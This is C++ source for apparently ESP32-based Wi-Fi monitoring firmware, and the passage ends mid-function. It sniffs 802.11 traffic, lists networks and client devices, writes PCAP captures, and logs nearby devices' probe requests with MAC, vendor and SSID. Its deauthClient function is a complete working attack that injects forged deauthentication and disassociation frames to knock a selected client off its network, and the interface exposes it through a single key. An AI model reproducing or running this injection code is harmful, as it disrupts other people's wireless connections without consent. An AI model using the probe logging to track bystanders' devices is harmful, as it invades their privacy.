#include "wifimon_functions.h"
#include "oui_lookup.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "clock_manager.h"
#include <SD.h>

extern InputHandling inputHandler;

// ── static ring buffers ───────────────────────────────────────────────────────
volatile WmPkt      WiFiMonitor::s_ring[WM_PKT_RING];
volatile uint8_t    WiFiMonitor::s_head = 0;
volatile uint8_t    WiFiMonitor::s_tail = 0;

volatile WmRawFrame WiFiMonitor::s_pcapRing[WM_PCAP_RING];
volatile uint8_t    WiFiMonitor::s_pcapHead    = 0;
volatile uint8_t    WiFiMonitor::s_pcapTail    = 0;
volatile bool       WiFiMonitor::s_pcapActive  = false;
volatile uint32_t   WiFiMonitor::s_pcapDropped = 0;

// ── 802.11 constants ──────────────────────────────────────────────────────────
#define FTYPE_MGMT       0
#define FTYPE_CTRL       1
#define FTYPE_DATA       2
#define SUB_ASSOC_REQ    0
#define SUB_ASSOC_RESP   1
#define SUB_PROBE_REQ    4
#define SUB_PROBE_RESP   5
#define SUB_BEACON       8
#define SUB_DEAUTH       12
#define SUB_DISASSOC     10
#define TODS_BIT         0x01
#define FROMDS_BIT       0x02

static const uint8_t BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
static const uint8_t ZERO6[6] = {0,0,0,0,0,0};

// ── constructor ───────────────────────────────────────────────────────────────
WiFiMonitor::WiFiMonitor(DisplayManager& displayManager, SDCardManager& sdCardManager)
    : _dm(displayManager), _sd(sdCardManager) {
    resetAll();
}

void WiFiMonitor::resetAll() {
    _totalPkts = _beaconPkts = _probePkts = 0;
    _dataPkts  = _mgmtPkts  = _ctrlPkts  = _deauthPkts = 0;
    _netCount    = 0;
    _clientCount = 0;
    _view        = VIEW_NETS;
    _page        = 0;
    _selClient   = -1;
    _currentChannel = 1;
    _hopping       = false;
    _statusMsg[0]  = '\0';
    _statusExpiry  = 0;
    _pcapOpen        = false;
    _pcapFrames      = 0;
    _pcapPath[0]     = '\0';
    _lastPcapFlush   = 0;
    _probeOpen       = false;
    _probeCount      = 0;
    _lastProbeFlush  = 0;
    _probePath[0]    = '\0';
    _dedupCount      = 0;
    _dedupHead       = 0;
    _probePendCount  = 0;
    s_head = s_tail = 0;
    s_pcapHead    = s_pcapTail = 0;
    s_pcapActive  = false;
    s_pcapDropped = 0;
    memset(_nets,    0, sizeof(_nets));
    memset(_clients, 0, sizeof(_clients));
}

// ── channel ───────────────────────────────────────────────────────────────────
void WiFiMonitor::setChannel(int ch) {
    if (ch < 1 || ch > 13) return;
    _currentChannel = ch;
    esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);
}

// ── ISR callback — writes to ring ────────────────────────────────────────────
void IRAM_ATTR WiFiMonitor::rxCallback(void* buf, wifi_promiscuous_pkt_type_t pktType) {
    if (pktType == WIFI_PKT_MISC) return;
    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
    uint16_t len = p->rx_ctrl.sig_len;
    if (len < 10) return;

    // ── parsed ring (display/tracking) ───────────────────────────────────────
    if (len >= 24) {
        uint8_t next = (s_head + 1) % WM_PKT_RING;
        if (next != s_tail) {
            WmPkt& slot = (WmPkt&)s_ring[s_head];
            parseFrame(p->payload, len, p->rx_ctrl.channel, p->rx_ctrl.rssi, slot);
            s_head = next;
        }
    }

    // ── raw PCAP ring ────────────────────────────────────────────────────────
    if (s_pcapActive) {
        uint8_t pNext = (s_pcapHead + 1) % WM_PCAP_RING;
        if (pNext != s_pcapTail) {
            WmRawFrame& rf = (WmRawFrame&)s_pcapRing[s_pcapHead];
            rf.tsMs = (uint32_t)(esp_timer_get_time() / 1000ULL);
            rf.len  = len > WM_PCAP_SNAPLEN ? WM_PCAP_SNAPLEN : (uint16_t)len;
            memcpy(rf.data, p->payload, rf.len);
            s_pcapHead = pNext;
        } else {
            s_pcapDropped++;   // ring full — frame lost
        }
    }
}

// ── frame parser ─────────────────────────────────────────────────────────────
void WiFiMonitor::parseFrame(const uint8_t* d, uint16_t len,
                              uint8_t ch, int8_t rssi, WmPkt& out) {
    out.type    = (d[0] >> 2) & 0x03;
    out.subtype = (d[0] >> 4) & 0x0F;
    out.dsFlags = d[1] & 0x03;        // ToDS | FromDS
    out.rssi    = rssi;
    out.channel = ch;
    out.ssid[0] = '\0';

    memcpy(out.addr1, d +  4, 6);
    memcpy(out.addr2, d + 10, 6);
    memcpy(out.addr3, d + 16, 6);

    if (out.type == FTYPE_MGMT &&
        (out.subtype == SUB_BEACON ||
         out.subtype == SUB_PROBE_RESP ||
         out.subtype == SUB_PROBE_REQ)) {
        extractSSID(d, len, out.subtype, out.ssid);
    }
}

// ── SSID extraction ───────────────────────────────────────────────────────────
void IRAM_ATTR WiFiMonitor::extractSSID(const uint8_t* d, uint16_t len,
                                         uint8_t subtype, char* ssidOut) {
    uint16_t off = 24;
    if (subtype == SUB_BEACON || subtype == SUB_PROBE_RESP) off += 12;
    else if (subtype == SUB_ASSOC_REQ)                      off +=  4;

    while (off + 2 <= len) {
        uint8_t id  = d[off];
        uint8_t iel = d[off + 1];
        if (off + 2 + iel > len) break;
        if (id == 0) {
            uint8_t sl = iel > 32 ? 32 : iel;
            memcpy(ssidOut, d + off + 2, sl);
            ssidOut[sl] = '\0';
            return;
        }
        off += 2 + iel;
    }
    ssidOut[0] = '\0';
}

// ── ring drain ────────────────────────────────────────────────────────────────
void WiFiMonitor::processRing() {
    while (s_tail != s_head) {
        WmPkt pkt;
        memcpy(&pkt, (const void*)&s_ring[s_tail], sizeof(WmPkt));
        s_tail = (s_tail + 1) % WM_PKT_RING;
        handlePacket(pkt);
    }
}

// ── per-packet routing ────────────────────────────────────────────────────────
void WiFiMonitor::handlePacket(const WmPkt& p) {
    _totalPkts++;
    switch (p.type) {
    case FTYPE_MGMT:
        _mgmtPkts++;
        switch (p.subtype) {
        case SUB_BEACON:
            _beaconPkts++;
            trackNet(p);
            break;
        case SUB_PROBE_RESP:
            trackNet(p);
            break;
        case SUB_PROBE_REQ:
            _probePkts++;
            // addr2 = probing STA (unassociated)
            if (!(p.addr2[0] & 0x01)) { // skip multicast source
                trackClient(p.addr2, ZERO6, false, p.rssi);
                if (p.ssid[0])          // only log directed probes (not wildcard)
                    logProbe(p.addr2, p.ssid, p.rssi, millis());
            }
            break;
        case SUB_ASSOC_REQ:
            // addr1 = AP BSSID, addr2 = client STA
            trackClient(p.addr2, p.addr1, true, p.rssi);
            break;
        case SUB_DEAUTH:
        case SUB_DISASSOC:
            _deauthPkts++;
            break;
        }
        break;

    case FTYPE_DATA:
        _dataPkts++;
        {
            bool toDS   = (p.dsFlags & TODS_BIT)   != 0;
            bool fromDS = (p.dsFlags & FROMDS_BIT)  != 0;

            if (toDS && !fromDS) {
                // STA → AP: addr1=BSSID, addr2=STA
                if (!(p.addr2[0] & 0x01))
                    trackClient(p.addr2, p.addr1, true, p.rssi);
            } else if (!toDS && fromDS) {
                // AP → STA: addr1=STA, addr2=BSSID
                if (!(p.addr1[0] & 0x01))
                    trackClient(p.addr1, p.addr2, true, p.rssi);
            }
        }
        break;

    case FTYPE_CTRL:
        _ctrlPkts++;
        break;
    }

    // raw frames are captured directly in rxCallback into the PCAP ring
}

// ── network tracking ──────────────────────────────────────────────────────────
void WiFiMonitor::trackNet(const WmPkt& p) {
    // addr3 = BSSID for beacon/probe-resp
    const uint8_t* bssid = p.addr3;
    for (int i = 0; i < _netCount; i++) {
        if (memcmp(_nets[i].bssid, bssid, 6) == 0) {
            _nets[i].rssi = p.rssi;
            _nets[i].beacons++;
            if (p.ssid[0]) strncpy(_nets[i].ssid, p.ssid, 32);
            return;
        }
    }
    if (_netCount >= WM_MAX_NETS) return;
    WmNet& n = _nets[_netCount++];
    memcpy(n.bssid, bssid, 6);
    strncpy(n.ssid, p.ssid, 32); n.ssid[32] = '\0';
    n.rssi      = p.rssi;
    n.channel   = p.channel;
    n.beacons   = 1;
}

// ── client tracking ───────────────────────────────────────────────────────────
void WiFiMonitor::trackClient(const uint8_t* mac, const uint8_t* apBssid,
                               bool assoc, int8_t rssi) {
    if (memcmp(mac, BCAST, 6) == 0) return;   // skip broadcast source

    uint32_t now = millis();
    int idx = findClient(mac);
    if (idx >= 0) {
        WmClient& c = _clients[idx];
        // upgrade to associated if we now have a BSSID
        if (assoc && !c.associated) {
            memcpy(c.apBssid, apBssid, 6);
            c.associated = true;
        }
        c.rssi     = rssi;
        c.lastSeen = now;
        return;
    }

    if (_clientCount >= WM_MAX_CLIENTS) return;
    WmClient& c = _clients[_clientCount++];
    memcpy(c.mac,     mac,     6);
    memcpy(c.apBssid, apBssid, 6);
    c.associated = assoc;
    c.rssi       = rssi;
    c.lastSeen   = now;
    OuiInfo info = ouiLookup(mac);
    c.vendor     = info.vendor;
    c.type       = info.type;
}

// ── expire old unassociated clients ──────────────────────────────────────────
void WiFiMonitor::expireClients(uint32_t now) {
    int i = 0;
    while (i < _clientCount) {
        if (!_clients[i].associated && now - _clients[i].lastSeen > WM_CLIENT_TTL) {
            // compact: shift remaining entries down
            memmove(&_clients[i], &_clients[i+1],
                    (_clientCount - i - 1) * sizeof(WmClient));
            _clientCount--;
        } else {
            i++;
        }
    }
}

// ── lookup helpers ────────────────────────────────────────────────────────────
int WiFiMonitor::findNet(const uint8_t* bssid) const {
    for (int i = 0; i < _netCount; i++)
        if (memcmp(_nets[i].bssid, bssid, 6) == 0) return i;
    return -1;
}

int WiFiMonitor::countClientsForNet(const uint8_t* bssid) const {
    int n = 0;
    for (int i = 0; i < _clientCount; i++)
        if (_clients[i].associated && memcmp(_clients[i].apBssid, bssid, 6) == 0)
            n++;
    return n;
}

int WiFiMonitor::findClient(const uint8_t* mac) const {
    for (int i = 0; i < _clientCount; i++)
        if (memcmp(_clients[i].mac, mac, 6) == 0) return i;
    return -1;
}

String WiFiMonitor::macStr(const uint8_t* m) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0],m[1],m[2],m[3],m[4],m[5]);
    return String(buf);
}

// ── status banner ─────────────────────────────────────────────────────────────
void WiFiMonitor::setStatus(const char* msg, uint32_t ms) {
    strncpy(_statusMsg, msg, sizeof(_statusMsg)-1);
    _statusMsg[sizeof(_statusMsg)-1] = '\0';
    _statusExpiry = millis() + ms;
}

// ── display: NETS view ────────────────────────────────────────────────────────
void WiFiMonitor::drawNets() {
    _dm.clearScreen();
    _dm.setDefaultTextSize();
    _dm.setCursor(4, outputY);

    // ── header row ────────────────────────────────────────────────────────────
    _dm.setTextColor(TFT_CYAN);
    _dm.printText("[MON] ");
    _dm.setTextColor(TFT_WHITE);
    _dm.printText("CH:");
    _dm.setTextColor(TFT_YELLOW);
    if (_hopping) _dm.printText("HOP");
    else {
        char b[4]; snprintf(b, sizeof(b), "%d", _currentChannel);
        _dm.printText(b);
    }
    _dm.setTextColor(TFT_WHITE);
    _dm.printText("  PCAP:");
    _dm.setTextColor(_pcapOpen ? TFT_GREEN : 0x7BEF);
    if (_pcapOpen) {
        char b[24];
        if (s_pcapDropped > 0)
            snprintf(b, sizeof(b), "%lu frm -%lu", (unsigned long)_pcapFrames, (unsigned long)s_pcapDropped);
        else
            snprintf(b, sizeof(b), "%lu frm", (unsigned long)_pcapFrames);
        _dm.printText(b);
    } else {
        _dm.printText("OFF");
    }
    _dm.setTextColor(TFT_WHITE);
    {
        char b[20]; snprintf(b, sizeof(b), "  N:%d C:%d", _netCount, _clientCount);
        _dm.println(b);
    }

    // ── stats row ─────────────────────────────────────────────────────────────
    _dm.setCursor(4, _dm.getCursorY());
    {
        char b[64];
        if (_probeOpen && _probeCount > 0)
            snprintf(b, sizeof(b), "Pkts:%lu Bcn:%lu Prb:%lu Dth:%lu Log:%lu",
                     (unsigned long)_totalPkts, (unsigned long)_beaconPkts,
                     (unsigned long)_probePkts, (unsigned long)_deauthPkts,
                     (unsigned long)_probeCount);
        else
            snprintf(b, sizeof(b), "Pkts:%lu Bcn:%lu Prb:%lu Dth:%lu",
                     (unsigned long)_totalPkts, (unsigned long)_beaconPkts,
                     (unsigned long)_probePkts, (unsigned long)_deauthPkts);
        _dm.setTextColor(0xBDF7);
        _dm.println(b);
    }

    // ── controls row ─────────────────────────────────────────────────────────
    _dm.setCursor(4, _dm.getCursorY());
    _dm.setTextColor(TFT_GREEN);  _dm.printText("[v]");
    _dm.setTextColor(TFT_WHITE);  _dm.printText("cli ");
    _dm.setTextColor(TFT_GREEN);  _dm.printText("[h]");
    _dm.setTextColor(TFT_WHITE);  _dm.printText("hop ");
    _dm.setTextColor(TFT_GREEN);  _dm.printText("[1-9]");
    _dm.setTextColor(TFT_WHITE);  _dm.printText("ch ");
    _dm.setTextColor(TFT_GREEN);  _dm.printText("[s]");
    _dm.setTextColor(TFT_WHITE);  _dm.printText("pcap ");
    _dm.setTextColor(_probeOpen ? TFT_CYAN : TFT_GREEN); _dm.printText("[p]");
    _dm.setTextColor(TFT_WHITE);  _dm.printText("log ");
    _dm.setTextColor(TFT_GREEN);  _dm.printText("[q]");
    _dm.setTextColor(TFT_WHITE);  _dm.println("qt");

    _dm.printSeparator();

    // status banner (replaces column header when active)
    if (millis() < _statusExpiry) {
        _dm.setCursor(4, _dm.getCursorY());
        _dm.setTextColor(TFT_YELLOW);
        _dm.println(_statusMsg);
    } else {
        // column header
        _dm.setTextSize(1);
        _dm.setCursor(4, _dm.getCursorY());
        _dm.setTextColor(TFT_YELLOW);
        _dm.println("BSSID             CH RSSI Cli SSID");
        _dm.setDefaultTextSize();
    }

    // ── network rows ─────────────────────────────────────────────────────────
    _dm.setTextSize(1);
    const int PER_PAGE = 10;
    int start = _page * PER_PAGE;
    int end   = min(start + PER_PAGE, _netCount);

    for (int i = start; i < end; i++) {
        _dm.setCursor(4, _dm.getCursorY());

        // BSSID
        _dm.setTextColor(TFT_CYAN);
        _dm.printText(macStr(_nets[i].bssid).c_str());

        // channel
        _dm.setTextColor(TFT_WHITE);
        char info[32];
        snprintf(info, sizeof(info), " %2d %4d  %2d ",
                 _nets[i].channel, _nets[i].rssi,
                 countClientsForNet(_nets[i].bssid));
        _dm.printText(info);

        // SSID
        if (_nets[i].ssid[0]) {
            _dm.setTextColor(TFT_GREEN);
            char ssid[18]; snprintf(ssid, sizeof(ssid), "%.17s", _nets[i].ssid);
            _dm.println(ssid);
        } else {
            _dm.setTextColor(0x7BEF);
            _dm.println("<hidden>");
        }
    }

    if (_netCount == 0) {
        _dm.setCursor(4, _dm.getCursorY());
        _dm.setTextColor(0x7BEF);
        _dm.println("Scanning...");
    }

    // pagination
    if (_netCount > PER_PAGE) {
        int tot = (_netCount + PER_PAGE - 1) / PER_PAGE;
        _dm.setCursor(4, _dm.getCursorY());
        _dm.setTextColor(0x7BEF);
        char pb[24]; snprintf(pb, sizeof(pb), "[a]prev [l]next  %d/%d", _page+1, tot);
        _dm.println(pb);
    }

    _dm.setTextColor(TFT_WHITE);
    _dm.setDefaultTextSize();
}

// ── display: CLIENTS view ─────────────────────────────────────────────────────
void WiFiMonitor::drawClients() {
    _dm.clearScreen();
    _dm.setDefaultTextSize();
    _dm.setCursor(4, outputY);

    // ── header ────────────────────────────────────────────────────────────────
    _dm.setTextColor(TFT_CYAN);
    _dm.printText("[CLIENTS] ");
    _dm.setTextColor(TFT_WHITE);
    {
        char b[32]; snprintf(b, sizeof(b), "%d devices  CH:", _clientCount);
        _dm.printText(b);
    }
    _dm.setTextColor(TFT_YELLOW);
    if (_hopping) _dm.println("HOP");
    else {
        char b[4]; snprintf(b, sizeof(b), "%d", _currentChannel);
        _dm.println(b);
    }

    // ── controls ─────────────────────────────────────────────────────────────
    _dm.setCursor(4, _dm.getCursorY());
    _dm.setTextColor(TFT_GREEN);  _dm.printText("[^v]");
    _dm.setTextColor(TFT_WHITE);  _dm.printText("sel ");
    _dm.setTextColor(TFT_GREEN);  _dm.printText("[d]");
    _dm.setTextColor(TFT_RED);    _dm.printText("dauth ");
    _dm.setTextColor(TFT_GREEN);  _dm.printText("[v]");
    _dm.setTextColor(TFT_WHITE);  _dm.printText("nets ");
    _dm.setTextColor(TFT_GREEN);  _dm.printText("[q]");
    _dm.setTextColor(TFT_WHITE);  _dm.println("quit");

    _dm.printSeparator();

    // ── status / notice banner ────────────────────────────────────────────────
    bool showStatus = millis() < _statusExpiry;
    _dm.setTextSize(1);
    _dm.setCursor(4, _dm.getCursorY());
    if (showStatus) {
        // colour: green = success, red = fail, yellow = info
        uint16_t col = TFT_YELLOW;
        if (strstr(_statusMsg, "ok"))   col = TFT_GREEN;
        if (strstr(_statusMsg, "fail") || strstr(_statusMsg, "Cannot")) col = TFT_RED;
        _dm.setTextColor(col);
        _dm.println(_statusMsg);
    } else {
        _dm.setTextColor(TFT_YELLOW);
        _dm.println("  MAC               Vendor   Type  RSSI  AP");
    }

    // ── client rows ───────────────────────────────────────────────────────────
    const int PER_PAGE = 12;
    int start = _page * PER_PAGE;
    int end   = min(start + PER_PAGE, _clientCount);

    for (int i = start; i < end; i++) {
        WmClient& c = _clients[i];
        bool sel = (i == _selClient);   // _selClient is now absolute index

        _dm.setCursor(4, _dm.getCursorY());

        // cursor arrow (only show when something is selected)
        bool hasSel = (_selClient >= 0);
        _dm.setTextColor(sel ? TFT_YELLOW : TFT_WHITE);
        _dm.printText(sel && hasSel ? ">" : " ");

        // MAC
        _dm.setTextColor(sel ? TFT_YELLOW : TFT_CYAN);
        _dm.printText(macStr(c.mac).c_str());

        // vendor
        char vnd[10];
        snprintf(vnd, sizeof(vnd), " %-8.8s", c.vendor ? c.vendor : "?");
        _dm.setTextColor(sel ? TFT_YELLOW : 0xBDF7);
        _dm.printText(vnd);

        // type
        char typ[8];
        snprintf(typ, sizeof(typ), " %-5.5s", c.type ? c.type : "?");
        _dm.setTextColor(sel ? TFT_YELLOW : TFT_WHITE);
        _dm.printText(typ);

        // RSSI
        char rssi[7]; snprintf(rssi, sizeof(rssi), " %4d", (int)c.rssi);
        _dm.setTextColor(sel ? TFT_YELLOW : 0x7BEF);
        _dm.printText(rssi);

        // AP SSID
        if (c.associated) {
            int ni = findNet(c.apBssid);
            _dm.setTextColor(sel ? TFT_YELLOW : TFT_GREEN);
            if (ni >= 0 && _nets[ni].ssid[0]) {
                char ap[9]; snprintf(ap, sizeof(ap), " %.8s", _nets[ni].ssid);
                _dm.println(ap);
            } else {
                char ap[10];
                snprintf(ap, sizeof(ap), " %02X%02X%02X",
                         c.apBssid[3], c.apBssid[4], c.apBssid[5]);
                _dm.println(ap);
            }
        } else {
            _dm.setTextColor(0x7BEF);
            _dm.println(" ---");
        }
    }

    if (_clientCount == 0) {
        _dm.setCursor(4, _dm.getCursorY());
        _dm.setTextColor(0x7BEF);
        _dm.println("No clients seen yet...");
    }

    // pagination indicator
    if (_clientCount > PER_PAGE) {
        int tot = (_clientCount + PER_PAGE - 1) / PER_PAGE;
        _dm.setCursor(4, _dm.getCursorY());
        _dm.setTextColor(0x7BEF);
        char pb[28]; snprintf(pb, sizeof(pb), "trackpad up/dn  pg %d/%d", _page+1, tot);
        _dm.println(pb);
    }

    // ── bottom info bar for selected client ───────────────────────────────────
    if (_selClient >= 0 && _selClient < _clientCount && !showStatus) {
        WmClient& c = _clients[_selClient];
        _dm.setCursor(4, _dm.getCursorY());
        _dm.setTextColor(TFT_YELLOW);
        if (c.associated) {
            int ni = findNet(c.apBssid);
            char bar[54];
            snprintf(bar, sizeof(bar), "[d] deauth %s from %s",
                     macStr(c.mac).c_str(),
                     ni >= 0 && _nets[ni].ssid[0] ? _nets[ni].ssid : "AP");
            _dm.println(bar);
        } else {
            char bar[40];
            snprintf(bar, sizeof(bar), "unassoc — cannot deauth");
            _dm.setTextColor(0x7BEF);
            _dm.println(bar);
        }
    }

    _dm.setTextColor(TFT_WHITE);
    _dm.setDefaultTextSize();
}

// ── targeted deauth ───────────────────────────────────────────────────────────
void WiFiMonitor::deauthClient(int absIdx) {
    if (absIdx < 0 || absIdx >= _clientCount) return;

    WmClient& c = _clients[absIdx];
    if (!c.associated) {
        setStatus("Cannot deauth: client unassociated");
        return;
    }

    // look up AP channel
    int ni = findNet(c.apBssid);
    int apCh = (ni >= 0) ? _nets[ni].channel : _currentChannel;

    // stop promiscuous — required before switching to APSTA
    s_pcapActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    // APSTA mode needed for WIFI_IF_AP raw injection
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP("x", nullptr, apCh, 1, 0, false);
    vTaskDelay(pdMS_TO_TICKS(80));

    // build and send directed deauth + disassoc in both directions
    uint8_t frame[26];
    volatile uint32_t ok = 0, fail = 0;

    auto buildFrame = [](uint8_t* f, const uint8_t* da, const uint8_t* sa,
                         const uint8_t* bssid, bool disassoc) {
        f[0] = disassoc ? 0xA0 : 0xC0;
        f[1] = 0x00;
        f[2] = 0x3A; f[3] = 0x01;
        memcpy(f+4,  da,    6);
        memcpy(f+10, sa,    6);
        memcpy(f+16, bssid, 6);
        uint16_t seq = random(0, 4096);
        f[22] = (seq >> 4) & 0xFF;
        f[23] = (seq & 0x0F) << 4;
        f[24] = 0x07; f[25] = 0x00;
    };

    // send 5 rounds of 4 frame variants
    for (int r = 0; r < 5; r++) {
        buildFrame(frame, c.mac, c.apBssid, c.apBssid, false); // AP→STA deauth
        for (int i = 0; i < 3; i++) {
            esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
            if (e == ESP_OK) ok++; else fail++;
            vTaskDelay(pdMS_TO_TICKS(1));
        }
        buildFrame(frame, c.mac, c.apBssid, c.apBssid, true);  // AP→STA disassoc
        for (int i = 0; i < 3; i++) {
            esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
            if (e == ESP_OK) ok++; else fail++;
            vTaskDelay(pdMS_TO_TICKS(1));
        }
        buildFrame(frame, c.apBssid, c.mac, c.apBssid, false); // STA→AP deauth
        for (int i = 0; i < 3; i++) {
            esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
            if (e == ESP_OK) ok++; else fail++;
            vTaskDelay(pdMS_TO_TICKS(1));
        }
        buildFrame(frame, c.apBssid, c.mac, c.apBssid, true);  // STA→AP disassoc
        for (int i = 0; i < 3; i++) {
            esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
            if (e == ESP_OK) ok++; else fail++;
            vTaskDelay(pdMS_TO_TICKS(1));
        }
    }

    // return to STA + promiscuous on current monitor channel
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    vTaskDelay(pdMS_TO_TICKS(50));

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(rxCallback);
    setChannel(_currentChannel);
    s_pcapActive = _pcapOpen;   // re-enable PCAP if it was running

    char msg[52];
    if (fail == 0)
        snprintf(msg, sizeof(msg), "Deauth ok! %lu frames sent", (unsigned long)ok);
    else if (ok == 0)
        snprintf(msg, sizeof(msg), "Deauth FAILED (%lu errors)", (unsigned long)fail);
    else
        snprintf(msg, sizeof(msg), "Deauth done: %lu ok, %lu fail", (unsigned long)ok, (unsigned long)fail);
    setStatus(msg, 3500);
}

// ── PCAP: open file and write global header (call BEFORE promiscuous) ────────
void WiFiMonitor::openPcap() {
    if (!_sd.canAccessSD()) return;
    _sd.ensureDir("/logs");
    _sd.ensureDir("/logs/wm");

    // probe for next free NNN — same pattern used by wguard/espsniff (never overwrites)
    uint16_t nextNum = 1;
    while (nextNum < 999) {
        char probe[40];
        snprintf(probe, sizeof(probe), "/logs/wm/%03u.cap", nextNum);
        if (!SD.exists(probe)) break;
        nextNum++;
    }
    snprintf(_pcapPath, sizeof(_pcapPath), "/logs/wm/%03u.cap", nextNum);
    _pcapFile = SD.open(_pcapPath, FILE_WRITE);
    if (!_pcapFile) { _pcapPath[0] = '\0'; return; }

    // libpcap global header — linktype 105 = LINKTYPE_IEEE802_11
    struct __attribute__((packed)) {
        uint32_t magic    = 0xa1b2c3d4;
        uint16_t ver_maj  = 2;
        uint16_t ver_min  = 4;
        int32_t  tz       = 0;
        uint32_t sig      = 0;
        uint32_t snap     = 65535;
        uint32_t linktype = 105;
    } ghdr;
    _pcapFile.write((uint8_t*)&ghdr, sizeof(ghdr));
    _pcapFile.flush();

    _pcapOpen      = true;
    _pcapFrames    = 0;
    _lastPcapFlush = millis();
    s_pcapHead    = s_pcapTail = 0;
    s_pcapDropped = 0;
    s_pcapActive  = true;
}

// ── PCAP: flush buffered frames to SD ────────────────────────────────────────
// Pauses promiscuous while writing — same pattern as wguard doAutoSave.
void WiFiMonitor::flushPcap() {
    if (!_pcapOpen || s_pcapHead == s_pcapTail) return;

    // gate ISR — stop new frames entering ring
    s_pcapActive = false;
    esp_wifi_set_promiscuous(false);

    // drain ring → write PCAP records
    struct __attribute__((packed)) { uint32_t ts_sec, ts_usec, incl_len, orig_len; } rh;
    while (s_pcapTail != s_pcapHead) {
        WmRawFrame rf;
        memcpy(&rf, (const void*)&s_pcapRing[s_pcapTail], sizeof(WmRawFrame));
        s_pcapTail = (s_pcapTail + 1) % WM_PCAP_RING;

        rh.ts_sec  = rf.tsMs / 1000;
        rh.ts_usec = (rf.tsMs % 1000) * 1000;
        rh.incl_len = rh.orig_len = rf.len;
        _pcapFile.write((uint8_t*)&rh, sizeof(rh));
        _pcapFile.write(rf.data, rf.len);
        _pcapFrames++;
    }
    _pcapFile.flush();
    _lastPcapFlush = millis();

    // flush probe log in the same promiscuous-paused window (GDMA rule)
    flushProbeLog();
    _lastProbeFlush = millis();

    // resume promiscuous
    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(rxCallback);
    setChannel(_currentChannel);
    s_pcapActive = true;
}

// ── PCAP: final flush + close ─────────────────────────────────────────────────
void WiFiMonitor::closePcap() {
    if (!_pcapOpen) return;
    s_pcapActive = false;
    // drain remaining frames (promiscuous already off at call site)
    struct __attribute__((packed)) { uint32_t ts_sec, ts_usec, incl_len, orig_len; } rh;
    while (s_pcapTail != s_pcapHead) {
        WmRawFrame rf;
        memcpy(&rf, (const void*)&s_pcapRing[s_pcapTail], sizeof(WmRawFrame));
        s_pcapTail = (s_pcapTail + 1) % WM_PCAP_RING;
        rh.ts_sec  = rf.tsMs / 1000;
        rh.ts_usec = (rf.tsMs % 1000) * 1000;
        rh.incl_len = rh.orig_len = rf.len;
        _pcapFile.write((uint8_t*)&rh, sizeof(rh));
        _pcapFile.write(rf.data, rf.len);
        _pcapFrames++;
    }
    _pcapFile.flush();
    _pcapFile.close();
    _pcapOpen = false;
}

// ── probe log: open (append mode) — call BEFORE promiscuous ──────────────────
void WiFiMonitor::openProbeLog() {
    if (!_sd.canAccessSD()) return;
    _sd.ensureDir("/logs");
    strncpy(_probePath, "/logs/probes.csv", sizeof(_probePath) - 1);
    _probePath[sizeof(_probePath) - 1] = '\0';
    bool isNew = !SD.exists(_probePath);
    _probeFile = SD.open(_probePath, FILE_APPEND);
    if (!_probeFile) { _probePath[0] = '\0'; return; }
    if (isNew) {
        _probeFile.println("time_ms,mac,vendor,ssid,rssi");
        _probeFile.flush();
    }
    _probeOpen      = true;
    _probeCount     = 0;
    _dedupCount     = 0;
    _dedupHead      = 0;
    _probePendCount = 0;
    _lastProbeFlush = millis();
}

// ── probe log: write pending entries — call with promiscuous paused ───────────
void WiFiMonitor::flushProbeLog() {
    if (!_probeOpen || _probePendCount == 0) return;
    for (int i = 0; i < _probePendCount; i++) {
        WmProbeEntry& e = _probePending[i];
        OuiInfo info = ouiLookup(e.mac);
        char line[108];
        snprintf(line, sizeof(line), "%lu,%02X:%02X:%02X:%02X:%02X:%02X,%s,%s,%d",
            (unsigned long)e.tsMs,
            e.mac[0], e.mac[1], e.mac[2], e.mac[3], e.mac[4], e.mac[5],
            info.vendor ? info.vendor : "?",
            e.ssid, (int)e.rssi);
        _probeFile.println(line);
        _probeCount++;
    }
    _probeFile.flush();
    _probePendCount = 0;
}

// ── probe log: final flush + close ───────────────────────────────────────────
void WiFiMonitor::closeProbeLog() {
    if (!_probeOpen) return;
    flushProbeLog();
    _probeFile.close();
    _probeOpen = false;
}

// ── probe log: deduplicate and buffer one entry ───────────────────────────────
void WiFiMonitor::logProbe(const uint8_t* mac, const char* ssid,
                            int8_t rssi, uint32_t tsMs) {
    if (!_probeOpen || !ssid || !ssid[0]) return;
    // dedup: skip if this exact MAC+SSID was already logged this session
    int check = (_dedupCount < WM_PROBE_DEDUP) ? _dedupCount : WM_PROBE_DEDUP;
    for (int i = 0; i < check; i++) {
        if (memcmp(_dedup[i].mac, mac, 6) == 0 &&
            strcmp(_dedup[i].ssid, ssid) == 0) return;
    }
    // add to dedup ring (circular — overwrites oldest when full)
    memcpy(_dedup[_dedupHead].mac, mac, 6);
    strncpy(_dedup[_dedupHead].ssid, ssid, 32);
    _dedup[_dedupHead].ssid[32] = '\0';
    _dedupHead = (_dedupHead + 1) % WM_PROBE_DEDUP;
    if (_dedupCount < WM_PROBE_DEDUP) _dedupCount++;
    // buffer for next SD flush
    if (_probePendCount < WM_PROBE_BUF) {
        WmProbeEntry& e = _probePending[_probePendCount++];
        memcpy(e.mac, mac, 6);
        strncpy(e.ssid, ssid, 32); e.ssid[32] = '\0';
